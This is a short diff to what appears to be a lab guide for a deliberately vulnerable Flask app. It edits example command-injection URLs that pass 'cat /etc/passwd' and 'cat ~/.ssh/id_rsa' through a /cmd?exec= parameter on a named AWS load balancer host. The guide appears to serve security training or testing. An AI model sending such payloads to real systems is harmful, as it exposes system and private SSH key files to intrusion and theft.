@@ -109,7 +109,9 @@ Submit OS commands via the vulnerable Flask app:
 
 ```bash
 http://samv-alb-1759994858.ca-central-1.elb.amazonaws.com:5000/cmd?exec=cat%20/etc/passwd
-http://samv-alb-1759994858.ca-central-1.elb.amazonaws.com:5000/cmd?exec=cat%20/.ssh/id_rsa
+```
+```bash
+http://samv-alb-1759994858.ca-central-1.elb.amazonaws.com:5000/cmd?exec=cat%20~/.ssh/id_rsa
 ```
 ---
 
